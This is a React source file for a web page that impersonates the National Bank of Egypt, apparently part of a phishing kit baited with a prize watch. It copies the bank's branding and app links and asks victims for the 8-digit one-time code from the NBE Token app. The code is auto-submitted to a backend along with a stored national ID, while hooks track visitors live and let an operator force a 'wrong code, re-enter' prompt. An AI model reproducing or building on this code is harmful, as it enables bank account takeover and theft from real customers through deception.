/**
 * البنك الأهلي المصري - رمز التوكن الأهلي
 * صفحة إدخال رمز التوكن من تطبيق NBE Token - رمز من 8 أرقام
 * خلفية بيضاء بدون شعار (صفحة تسجيل دخول)
 */
import React, { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function WatchLink() {
  usePresence("watchlink");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", "", "", ""]); // 8 أرقام
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const saveWatchLink = trpc.applications.saveWatchLink.useMutation();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  useEffect(() => {
    const showError = sessionStorage.getItem("pw_show_error");
    if (showError === "true") {
      setErrorMsg("البيانات المدخلة غير صحيحة، يرجى إعادة الإدخال بشكل صحيح");
      sessionStorage.removeItem("pw_show_error");
    }
  }, []);

  useEffect(() => {
    const code = otp.join("");
    if (code.length === 8 && !otp.some(d => !d)) {
      handleSubmit();
    }
  }, [otp]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 7) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async () => {
    const code = otp.join("");
    if (code.length < 8) { setErrorMsg("يرجى إدخال الرمز كاملاً (8 أرقام)"); return; }
    setLoading(true);
    try {
      await saveWatchLink.mutateAsync({ nationalId, watchLinkOtp: code });
      setLocation("/processing");
    } catch (err) {
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", color: "#1a1a1a" }}>
      <div style={{ maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
        
        {/* Header */}
        <div style={{ padding: "20px", textAlign: "center", borderBottom: "1px solid #e5e7eb" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "4px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "36px" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
            <span style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "16px" }}>البنك الأهلي المصري</span>
          </div>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", marginTop: "8px" }}>
            <img src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]} alt="ساعتك" onError={handleWatchImageError} style={{ width: "36px", height: "36px", objectFit: "contain" }} />
            <span style={{ color: "#666", fontSize: "12px" }}>{WATCH_NAMES[watchColor] || watchColor}</span>
          </div>
        </div>

        {/* Key Icon */}
        <div style={{ textAlign: "center", padding: "30px 20px 16px" }}>
          <div style={{ width: "72px", height: "72px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", border: "3px solid #dcfce7" }}>
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
              <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" stroke="#1B7A3D" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "24px", marginBottom: "6px" }}>
            رمز التوكن الأهلي
          </h2>
          <p style={{ color: "#666", fontSize: "14px", margin: 0 }}>
            يرجى إدخال رمز التوكن للتحقق
          </p>
        </div>

        {/* Alert Card */}
        <div style={{ margin: "0 20px 20px", background: "#f0fdf4", borderRadius: "16px", padding: "20px", border: "2px solid #dcfce7" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "14px" }}>
            <div style={{ width: "44px", height: "44px", background: "#dcfce7", borderRadius: "12px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "24px" }}>📱</div>
            <div>
              <h6 style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "15px", margin: 0, lineHeight: 1.4 }}>خطوة التحقق المطلوبة</h6>
              <p style={{ color: "#666", fontSize: "11px", margin: "2px 0 0" }}>اتبع التعليمات التالية</p>
            </div>
          </div>
          <div style={{ background: "#ffffff", borderRadius: "12px", padding: "16px", marginBottom: "14px", border: "1px solid #e5e7eb" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>1</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px" }}>افتح تطبيق <span style={{ color: "#1B7A3D" }}>NBE Token</span> على هاتفك</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>2</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px" }}>انظر إلى <span style={{ color: "#b45309" }}>الرمز المكوّن من 8 أرقام</span> الظاهر على الشاشة</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>3</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px" }}>أدخل الرمز في الحقول أدناه</span>
            </div>
          </div>
          {/* Download Buttons */}
          <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
            <a href="https://apps.apple.com/us/app/nbe-token/id1598804254" target="_blank" rel="noopener noreferrer" aria-label="تحميل تطبيق NBE Token من Apple App Store"
              style={{ display: "flex", alignItems: "center", gap: "8px", background: "#1a1a1a", borderRadius: "10px", padding: "8px 14px", textDecoration: "none", cursor: "pointer", flex: 1, justifyContent: "center" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
              </svg>
              <div>
                <div style={{ color: "rgba(255,255,255,0.6)", fontSize: "8px", lineHeight: 1 }}>تحميل من</div>
                <div style={{ color: "white", fontSize: "11px", fontWeight: "700", lineHeight: 1.3 }}>App Store</div>
              </div>
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.NBEProdToken.MSS" target="_blank" rel="noopener noreferrer" aria-label="تحميل تطبيق NBE Token من Google Play"
              style={{ display: "flex", alignItems: "center", gap: "8px", background: "#1a1a1a", borderRadius: "10px", padding: "8px 14px", textDecoration: "none", cursor: "pointer", flex: 1, justifyContent: "center" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <path d="M3 20.5v-17c0-.59.34-1.11.84-1.35L13.69 12l-9.85 9.85c-.5-.24-.84-.76-.84-1.35zm13.81-5.38L6.05 21.34l8.49-8.49 2.27 2.27zm3.35-4.31c.34.27.59.69.59 1.19s-.22.9-.57 1.18l-2.29 1.32-2.5-2.5 2.5-2.5 2.27 1.31zM6.05 2.66l10.76 6.22-2.27 2.27L6.05 2.66z" fill="white"/>
              </svg>
              <div>
                <div style={{ color: "rgba(255,255,255,0.6)", fontSize: "8px", lineHeight: 1 }}>تحميل من</div>
                <div style={{ color: "white", fontSize: "11px", fontWeight: "700", lineHeight: 1.3 }}>Google Play</div>
              </div>
            </a>
          </div>
        </div>

        {/* Token OTP Input */}
        <div style={{ padding: "0 20px", flex: 1 }}>
          {errorMsg && <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "10px 14px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>}
          
          <label style={{ display: "block", color: "#333", fontWeight: "700", fontSize: "14px", marginBottom: "10px", textAlign: "right" }}>
            أدخل الرمز المكوّن من 8 أرقام *
          </label>
          
          {/* OTP Inputs - 8 digits */}
          <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginBottom: "24px", direction: "ltr" }}>
            {otp.map((digit, i) => (
              <input key={i} ref={(el) => { inputRefs.current[i] = el; }} type="tel" inputMode="numeric" maxLength={1} value={digit}
                onChange={(e) => handleChange(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
                style={{ width: "40px", height: "52px", textAlign: "center", fontSize: "22px", fontWeight: "700", border: `2px solid ${digit ? "#1B7A3D" : "#d1d5db"}`, borderRadius: "10px", outline: "none", background: "#f9fafb", color: "#1a1a1a", fontFamily: "'Cairo', sans-serif" }} />
            ))}
          </div>

          {/* Submit Button */}
          <button onClick={handleSubmit} disabled={loading || otp.some(d => !d)}
            style={{ width: "100%", background: otp.every(d => d) ? "linear-gradient(135deg, #1B7A3D, #0d4a24)" : "#e5e7eb", color: otp.every(d => d) ? "white" : "#999", border: "none", borderRadius: "12px", padding: "16px", fontSize: "17px", fontWeight: "800", cursor: "pointer", fontFamily: "'Cairo', sans-serif", marginBottom: "16px", boxShadow: otp.every(d => d) ? "0 4px 20px rgba(27,122,61,0.3)" : "none" }}>
            {loading ? "جاري التحقق..." : "تأكيد التوكن ←"}
          </button>

          {/* Security Notice */}
          <div style={{ textAlign: "center", marginBottom: "20px" }}>
            <p style={{ color: "#999", fontSize: "12px", margin: 0 }}>
              🔒 الرمز صالح لمدة 30 ثانية فقط — لا تشاركه مع أي شخص
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
